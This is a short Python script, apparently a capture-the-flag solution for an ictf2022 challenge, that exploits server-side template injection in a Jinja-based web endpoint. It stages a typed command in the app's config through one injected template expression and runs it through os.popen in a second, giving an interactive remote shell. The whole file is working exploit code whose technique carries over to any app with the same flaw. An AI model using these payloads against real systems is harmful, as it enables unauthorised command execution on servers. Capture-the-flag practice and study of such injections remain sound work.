#!/usr/bin/env python3

import requests

link = "https://sstigolf.ictf2022.iciaran.com/ssti?query="

def main():
	s = requests.session()

	while True:
		cmd = input(">>> ")
		
		query = "{{config.update(q=request.args.payload)}}&payload="+cmd
		resp = s.get(link + query).text
		assert resp == "None"
		
		query = "{{lipsum.__globals__.os.popen(config.q).read()}}"
		resp = s.get(link + query).text
		print( resp )


if __name__ == "__main__":
    main()